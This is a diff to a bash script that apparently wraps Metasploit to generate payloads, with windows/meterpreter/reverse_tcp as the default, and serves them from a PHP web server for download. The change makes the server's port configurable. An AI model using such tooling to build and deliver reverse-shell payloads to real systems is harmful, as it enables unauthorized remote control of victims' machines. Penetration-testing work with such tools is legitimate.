@@ -4,6 +4,7 @@
 # Use non-windows payloads at your own risk.
 # Press Ctrl-C at anytime to exit this script.
 
+
 function setpayload {
 #set payload options
 read -p "Enter Payload [windows/meterpreter/reverse_tcp]: " payload
@@ -185,9 +186,16 @@ if [ -z "$hsvr" ] || [ "$hsvr" = 'no' ] || [ "$hsvr" = 'n' ]
 else
 	if [ "$hsvr" = 'yes' ] || [ "$hsvr" = 'y' ]
 		then
-		gnome-terminal -x php -S 0.0.0.0:80 -t "$location"
+		read -p "Port number? [8080]: " hport
+		if [ -z "$hport" ]
+			then
+			hport="8080"
+		fi
+		gnome-terminal -x php -S 0.0.0.0:$hport -t "$location"
 		echo
-		echo PHP Server has started. Download the file at "http://$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')/$filename.$format"
+		echo PHP Server has started. Download the file at "http://$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}'):$hport/$filename.$format"
+	else
+		return
 	fi
 fi
 }
